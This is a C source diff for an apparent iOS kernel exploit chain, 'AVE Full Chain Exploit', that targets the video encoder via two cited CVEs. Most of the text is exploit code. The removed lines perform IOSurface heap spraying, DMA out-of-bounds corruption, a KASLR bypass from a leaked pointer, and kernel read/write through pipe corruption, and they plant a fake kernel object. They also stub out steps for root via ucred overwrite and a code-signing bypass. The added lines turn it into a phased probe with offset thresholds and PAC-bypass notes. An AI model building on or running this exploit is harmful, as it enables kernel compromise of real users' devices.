-        p("  Round %d: %d surfaces with corrupted backing memory\n", round, round_hits);
-        for (int i = 0; i < SPRAY_COUNT; i++)
-            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
-        usleep(200000);
-    }
-
-    p("\n  Total surfaces with DMA corruption: %d\n", total_corrupted_surfs);
-    if (total_corrupted_surfs > 0)
-        p("  *** DMA OOB INTO BACKING MEMORY CONFIRMED ***\n");
-
-    if (leaked) {
-        g_kaslr_slide = (leaked & 0xFFFFFFF000000000ULL) - 0xFFFFFE0007004000ULL;
-        g_kernel_base = 0xFFFFFE0007004000ULL + g_kaslr_slide;
-        p("  KASLR slide: 0x%016llx\n", (unsigned long long)g_kaslr_slide);
-        p("  Kernel base: 0x%016llx\n", (unsigned long long)g_kernel_base);
-    } else if (total_corrupted_surfs > 0) {
-        p("  DMA corruption detected but no kernel pointer found.\n");
-        p("  Corrupted bytes are encoded video bitstream (NAL units).\n");
-    } else {
-        p("  No DMA corruption detected after 10 rounds.\n");
-        p("  Possible: NTL=9 overflow within buffer slack, or surfaces not adjacent.\n");
-    }
-    return leaked;
-}
-
-static int step_kernel_rw(void) {
-    p("\n=== Step 2: Kernel R/W via Pipe Corruption ===\n");
-
-    p("  Spraying %d IOSurfaces + %d pipes interleaved...\n", SPRAY_COUNT, PIPE_COUNT);
-    int surfs_ok = 0, pipes_ok = 0;
-    for (int i = 0; i < SPRAY_COUNT; i++) {
-        g_surfaces[i] = create_tagged_surface(i);
-        if (g_surfaces[i]) surfs_ok++;
-        if (i < PIPE_COUNT) {
-            g_pipes[i][0] = g_pipes[i][1] = -1;
-            if (pipe(g_pipes[i]) == 0) {
-                uint32_t sentinel = 0xBEEF0000 | i;
-                uint32_t buf[1024];
-                for (int j = 0; j < 1024; j++) buf[j] = sentinel;
-                write(g_pipes[i][1], buf, sizeof(buf));
-                pipes_ok++;
-            }
-        }
-    }
-    p("  Created: %d surfaces, %d pipes\n", surfs_ok, pipes_ok);
-
-    int freed = 0;
-    for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE) {
-        if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; freed++; }
-    }
-    p("  Freed %d surface holes\n", freed);
-
-    do_encode(9, 5, 0xBB);
-    usleep(200000);
-
-    int corrupted_pipe = -1;
-    for (int i = 0; i < PIPE_COUNT; i++) {
-        if (g_pipes[i][0] < 0) continue;
-        int flags = fcntl(g_pipes[i][0], F_GETFL);
-        fcntl(g_pipes[i][0], F_SETFL, flags | O_NONBLOCK);
-        uint32_t buf[1024];
-        ssize_t n = read(g_pipes[i][0], buf, sizeof(buf));
-        if (n <= 0) continue;
-
-        uint32_t expected = 0xBEEF0000 | i;
-        for (int j = 0; j < (int)(n / (ssize_t)sizeof(uint32_t)); j++) {
-            if (buf[j] != expected) {
-                p("  PIPE[%d] CORRUPTED at word %d: 0x%08x (expected 0x%08x)\n",
-                  i, j, buf[j], expected);
-                corrupted_pipe = i;
-                int start = j > 4 ? j - 4 : 0;
-                int end = j + 8 < (int)(n / sizeof(uint32_t)) ? j + 8 : (int)(n / sizeof(uint32_t));
-                p("  Context:\n");
-                for (int k = start; k < end; k++)
-                    p("    [%d] 0x%08x%s\n", k, buf[k], k == j ? " <--" : "");
-                break;
-            }
-        }
-        if (corrupted_pipe >= 0) break;
-    }
-
-    if (corrupted_pipe >= 0) {
-        p("  *** PIPE CORRUPTION DETECTED — pipe[%d] ***\n", corrupted_pipe);
-        g_krw_pipe_r = g_pipes[corrupted_pipe][0];
-        g_krw_pipe_w = g_pipes[corrupted_pipe][1];
-    } else {
-        p("  No pipe corruption detected\n");
-    }
-
-    for (int i = 0; i < PIPE_COUNT; i++) {
-        if (i == corrupted_pipe) continue;
-        if (g_pipes[i][0] >= 0) close(g_pipes[i][0]);
-        if (g_pipes[i][1] >= 0) close(g_pipes[i][1]);
-    }
-    for (int i = 0; i < SPRAY_COUNT; i++)
-        if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
-
-    return corrupted_pipe >= 0 ? 0 : -1;
-}
-
-static int step_root(void) {
-    p("\n=== Step 3: Root via ucred Corruption ===\n");
-    p("  Current UID: %d\n", getuid());
-    if (getuid() == 0) { p("  Already root!\n"); return 0; }
-    if (g_krw_pipe_r < 0) { p("  No kernel R/W — skipping\n"); return -1; }
-    p("  [stub] ucred corruption requires confirmed R/W primitive\n");
-    return -1;
-}
-
-static int step_codesign_bypass(void) {
-    p("\n=== Step 4: Code Signing Bypass ===\n");
-    if (getuid() != 0) { p("  Not root — skipping\n"); return -1; }
-    p("  [stub] Trust cache injection requires root + R/W\n");
-    return -1;
-}
-
 int main(int argc, char *argv[]) {
-    signal(SIGBUS, sig_handler);
-    signal(SIGSEGV, sig_handler);
-    char path[1024];
-    const char *home = getenv("HOME");
-    if (!home) home = "/tmp";
-    const char *mode = (argc >= 2) ? argv[1] : "info";
-    snprintf(path, sizeof(path), "%s/Documents/ave_chain_%s.txt", home, mode);
-    out = fopen(path, "w");
-    if (!out) return 1;
+    char logpath[512];
+    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_full_chain.txt",
+             getenv("HOME") ? getenv("HOME") : "/tmp");
+    g_log = fopen(logpath, "w");
 
-    p("=== AVE Full Chain Exploit ===\n");
-    p("Mode: %s\nPID: %d\nUID: %d\n", mode, getpid(), getuid());
-    char buf[256]; size_t len;
-    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
-    p("Build: %s\n", buf);
-    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
-    p("Machine: %s\n", buf);
+    rlog("=== CVE-2026-114025 + CVE-2026-112465 Full Chain Probe ===\n");
+    rlog("Target: iPhone Duo (A20 Pro, iOS 27.1)\n");
+    rlog("Time: %s\n", __TIMESTAMP__);
+    rlog("PID: %d\n\n", getpid());
 
-    if (strcmp(mode, "info") == 0) {
-        p("\nModes:\n");
-        p("  detect     - Backing memory corruption test (NTL=9, safe)\n");
-        p("  detect16   - Same with NTL=16 (larger overflow)\n");
-        p("  detect32   - Same with NTL=32 (even larger)\n");
-        p("  combo276   - Combined Defect 1+2 test (NTL=276, enables gate)\n");
-        p("  gate_safe  - Gate activation scan (NTL 264-280, find threshold)\n");
-        p("  kaslr      - Step 1: KASLR bypass via backing memory leak\n");
-        p("  krw        - Step 2: Kernel R/W via pipe corruption\n");
-        p("  root       - Step 3: Root via ucred overwrite\n");
-        p("  codesign   - Step 4: Trust cache / CS_DEBUGGED bypass\n");
-        p("  chain      - Run all steps in sequence\n");
-        p("  status     - Check current privilege level\n");
-        p("  csflags    - Read current process CS flags\n");
-    } else if (strncmp(mode, "detect", 6) == 0) {
-        int ntl = 9;
-        if (strcmp(mode, "detect16") == 0) ntl = 16;
-        else if (strcmp(mode, "detect32") == 0) ntl = 32;
-        p("\n=== DMA OOB Backing Memory Detection (NTL=%d) ===\n", ntl);
-        p("Spray %d IOSurfaces, fill backing memory with 0xCAFExxxx,\n", SPRAY_COUNT);
-        p("free every %dth, encode with NTL=%d, check for changes.\n\n", HOLE_STRIDE, ntl);
-        int total_hits = 0;
-        for (int round = 0; round < 5; round++) {
-            if (g_signal) break;
-            p("--- Round %d ---\n", round);
-            for (int i = 0; i < SPRAY_COUNT; i++)
-                g_surfaces[i] = create_tagged_surface(i);
-            int created = 0;
-            for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) created++;
-            p("  Created %d surfaces\n", created);
-            for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
-                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
-            do_encode(ntl, 3, 0xBB);
-            usleep(200000);
-            int hits = 0;
-            for (int i = 0; i < SPRAY_COUNT; i++) {
-                if (!g_surfaces[i]) continue;
-                if (check_backing_memory(g_surfaces[i], i) > 0) hits++;
-            }
-            p("  Round %d result: %d surfaces with corrupted backing memory\n", round, hits);
-            total_hits += hits;
-            for (int i = 0; i < SPRAY_COUNT; i++)
-                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
-            usleep(300000);
-        }
-        p("\n=== TOTAL: %d backing memory corruptions across 5 rounds ===\n", total_hits);
-        if (total_hits > 0)
-            p("*** DMA OOB WRITES INTO ADJACENT IOSURFACE BACKING MEMORY CONFIRMED ***\n");
-        else
-            p("No corruption detected. Try larger NTL (detect16/detect32) or more spray.\n");
-    } else if (strcmp(mode, "kaslr") == 0) {
-        step_kaslr_bypass();
-    } else if (strcmp(mode, "krw") == 0) {
-        step_kernel_rw();
-    } else if (strcmp(mode, "root") == 0) {
-        step_root();
-    } else if (strcmp(mode, "codesign") == 0) {
-        step_codesign_bypass();
-    } else if (strcmp(mode, "chain") == 0) {
-        p("\n========== FULL CHAIN ==========\n");
-        uint64_t leak = step_kaslr_bypass();
-        if (!leak) p("\n[!] KASLR bypass failed — continuing\n");
-        int krw = step_kernel_rw();
-        if (krw < 0) { p("\n[!] Kernel R/W failed\n"); goto done; }
-        int root = step_root();
-        if (root < 0) { p("\n[!] Root failed\n"); goto done; }
-        step_codesign_bypass();
-        p("\n========== RESULT ==========\n");
-        p("UID: %d\n", getuid());
-        p("KASLR slide: 0x%llx\n", (unsigned long long)g_kaslr_slide);
-        p("K R/W: %s\n", g_krw_pipe_r >= 0 ? "YES" : "NO");
-    } else if (strcmp(mode, "csflags") == 0) {
-        p("\n=== CS Flags Probe ===\n");
-        p("PID: %d\n", getpid());
-        uint32_t csflags = 0;
-        int ret = csops(getpid(), 0 /* CS_OPS_STATUS */, &csflags, sizeof(csflags));
-        if (ret == 0) {
-            p("CS flags: 0x%08x\n", csflags);
-            p("  CS_VALID:      %s\n", (csflags & 0x00000001) ? "YES" : "no");
-            p("  CS_ADHOC:      %s\n", (csflags & 0x00000002) ? "YES" : "no");
-            p("  CS_GET_TASK_ALLOW: %s\n", (csflags & 0x00000004) ? "YES" : "no");
-            p("  CS_HARD:       %s\n", (csflags & 0x00000100) ? "YES" : "no");
-            p("  CS_KILL:       %s\n", (csflags & 0x00000200) ? "YES" : "no");
-            p("  CS_DEBUGGED:   %s\n", (csflags & 0x10000000) ? "YES" : "no");
-            p("  CS_PLATFORM_BINARY: %s\n", (csflags & 0x04000000) ? "YES" : "no");
-        } else {
-            p("csops failed: %d (%s)\n", errno, strerror(errno));
-        }
-        p("\nThis shows what flags our process currently has.\n");
-        p("After achieving kernel R/W, we can SET CS_DEBUGGED (0x10000000)\n");
-        p("on our proc_t.p_csflags to allow unsigned code execution.\n");
-        p("Critical question: does TXM independently validate?\n");
-    } else if (strcmp(mode, "combo276") == 0) {
-        p("\n=== Combined Defect 1+2 Test (NTL=276) ===\n");
-        p("NTL=276 triggers BOTH defects simultaneously:\n");
-        p("  Defect 2 (fill loop): writes to session_ctx+0x4678..+0x4AC4\n");
-        p("    Gate pointer at +0x4AC0 becomes non-NULL (enables code block)\n");
-        p("  Defect 1 (DMA OOB): 268 extra temporal layers mapped past buffer\n");
-        p("    DMA overflow writes into physically adjacent kernel memory\n\n");
-        p("WARNING: NTL=276 is aggressive. May panic. Proceed with caution.\n\n");
+    const char *mode = (argc > 1) ? argv[1] : "help";
 
-        p("Phase 1: IOSurface spray (%d surfaces, %d-byte backing)\n", SPRAY_COUNT, 16384);
-        for (int i = 0; i < SPRAY_COUNT; i++)
-            g_surfaces[i] = create_tagged_surface(i);
-        int created = 0;
-        for (int i = 0; i < SPRAY_COUNT; i++) if (g_surfaces[i]) created++;
-        p("  Created: %d surfaces\n", created);
+    if (strcmp(mode, "quick") == 0) {
+        rlog("QUICK: Phases 1-3 (verify + measure + 100 encodes)\n\n");
+        if (phase1_verify() != 0) goto done;
+        phase2_measure();
+        phase3_overflow(100);
 
-        p("Phase 2: Create holes (every %dth)\n", HOLE_STRIDE);
-        for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
-            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
+    } else if (strcmp(mode, "standard") == 0) {
+        rlog("STANDARD: Phases 1-4 (+ 250 encodes + OOB read)\n\n");
+        if (phase1_verify() != 0) goto done;
+        phase2_measure();
+        phase3_overflow(250);
+        phase4_oob_read(300);
 
-        p("Phase 3: mmap at 0x500000000 (Defect 2 fake object target)\n");
-        void *fake = mmap((void *)0x500000000ULL, 0x10000, PROT_READ | PROT_WRITE,
-                          MAP_FIXED | MAP_PRIVATE | MAP_ANON, -1, 0);
-        if (fake == MAP_FAILED) {
-            p("  mmap FAILED: %s\n", strerror(errno));
-            p("  Continuing without fake object (gate will crash on deref)\n");
-        } else {
-            p("  mmap OK at %p (64KB)\n", fake);
-            memset(fake, 0x41, 0x10000);
-            uint64_t *fp = (uint64_t *)fake;
-            fp[0] = 0x4141414141414141ULL;
-            fp[0x2D0/8] = (uint64_t)fake + 0x1000;
-            fp[0x98/8] = (uint64_t)fake + 0x2000;
-            p("  Planted fake object: +0x2D0 → %p, +0x98 → %p\n",
-              (void *)fp[0x2D0/8], (void *)fp[0x98/8]);
-        }
+    } else if (strcmp(mode, "full") == 0) {
+        rlog("FULL: All 6 phases\n\n");
+        if (phase1_verify() != 0) goto done;
+        phase2_measure();
+        phase3_overflow(100);
+        phase4_oob_read(300);
+        phase5_firmware(220, 0x4141);
+        phase6_spray(400);
 
-        p("Phase 4: Encode with NTL=276 (triggers both defects)\n");
-        p("  If this causes a panic, check /var/mobile/Library/Logs/CrashReporter\n");
-        do_encode(276, 2, 0x42);
-        usleep(500000);
+    } else if (strcmp(mode, "blraa") == 0) {
+        rlog("BLRAA: 250 encodes with layer_id=1 to trigger forced BLRAA\n");
+        rlog("WARNING: Entry 642 (+0x5F94) nonzero forces PAC-auth indirect call\n");
+        rlog("This WILL cause a kernel panic if PAC check fails!\n\n");
+        if (phase1_verify() != 0) goto done;
+        phase5_firmware(250, 1);
 
-        p("Phase 5: Check backing memory corruption\n");
-        int hits = 0;
-        for (int i = 0; i < SPRAY_COUNT; i++) {
-            if (!g_surfaces[i]) continue;
-            if (check_backing_memory(g_surfaces[i], i) > 0) hits++;
-        }
-        p("  Surfaces with corrupted backing: %d\n", hits);
-        if (hits > 0)
-            p("  *** DMA OOB AT NTL=276 CONFIRMED ***\n");
+    } else if (strcmp(mode, "read_only") == 0) {
+        rlog("READ_ONLY: OOB read test only (400 encodes)\n\n");
+        if (phase1_verify() != 0) goto done;
+        phase4_oob_read(400);
 
-        if (fake != MAP_FAILED) munmap(fake, 0x10000);
-        for (int i = 0; i < SPRAY_COUNT; i++)
-            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
+    } else if (strcmp(mode, "spray") == 0) {
+        rlog("SPRAY: IOSurface spray + cross-buffer test (400 encodes)\n\n");
+        if (phase1_verify() != 0) goto done;
+        phase6_spray(400);
 
-    } else if (strcmp(mode, "gate_safe") == 0) {
-        p("\n=== Gate Pointer Activation Test (safe NTL scan) ===\n");
-        p("Tests NTL values near the gate thresholds:\n");
-        p("  +0x4AC0 gate: needs NTL >= 276 (index 274+275 = both halves)\n");
-        p("  +0x51C8 gate: needs NTL >= 726 (index 660+661 = both halves)\n\n");
+    } else if (strcmp(mode, "firmware") == 0) {
+        int lid = (argc > 2) ? atoi(argv[2]) : 0x4141;
+        int enc = (argc > 3) ? atoi(argv[3]) : 220;
+        rlog("FIRMWARE: %d encodes with layer_id=0x%x\n\n", enc, lid);
+        if (phase1_verify() != 0) goto done;
+        phase5_firmware(enc, lid);
 
-        int test_ntls[] = {264, 268, 272, 274, 275, 276, 278, 280};
-        int n_tests = sizeof(test_ntls) / sizeof(test_ntls[0]);
-        for (int t = 0; t < n_tests; t++) {
-            if (g_signal) break;
-            int ntl = test_ntls[t];
-            p("--- NTL=%d (gate +0x4AC0 %s) ---\n", ntl,
-              ntl >= 276 ? "ACTIVE" : "inactive");
-            int r = do_encode(ntl, 1, 0x42);
-            if (r < 0) {
-                p("  Encode FAILED (session creation error)\n");
-            } else if (g_signal) {
-                p("  *** SIGNAL %d received — crash at NTL=%d ***\n", g_signal, ntl);
-                break;
-            } else {
-                p("  Survived NTL=%d (callbacks=%d)\n", ntl, r);
-            }
-            usleep(500000);
-        }
-
-    } else if (strcmp(mode, "status") == 0) {
-        p("UID: %d, GID: %d, PID: %d\n", getuid(), getgid(), getpid());
-        p("EUID: %d, EGID: %d\n", geteuid(), getegid());
     } else {
-        p("Unknown mode: %s\n", mode);
+        rlog("Usage: AVEFullChain <mode> [args]\n\n");
+        rlog("Modes:\n");
+        rlog("  quick      -- Phases 1-3: verify + measure + 100 encodes\n");
+        rlog("  standard   -- Phases 1-4: + 250 encodes + OOB read test\n");
+        rlog("  full       -- All 6 phases: complete chain test\n");
+        rlog("  blraa      -- Firmware with lid=1 (WILL PANIC if PAC fails!)\n");
+        rlog("  read_only  -- OOB read only (400 encodes)\n");
+        rlog("  spray      -- IOSurface spray + cross-buffer (400 encodes)\n");
+        rlog("  firmware <lid> <enc> -- Custom firmware param test\n");
+        rlog("\nKey entry thresholds:\n");
+        rlog("  256 (~86 enc):  First OOB write\n");
+        rlog("  602 (~201 enc): Guard array +0x5D14\n");
+        rlog("  630 (~210 enc): 56-byte SIMD header overwrite +0x5ED4\n");
+        rlog("  642 (~214 enc): Forced BLRAA +0x5F94\n");
+        rlog("  714 (~238 enc): W24 config +0x6414\n");
+        rlog("  1059 (~353 enc): Cross-buffer OOB into adjacent alloc\n");
     }
 
 done:
-    p("\n=== Done ===\n");
-    fclose(out);
+    rlog("\n=== Full chain probe complete ===\n");
+    if (g_log) fclose(g_log);
     return 0;
 }
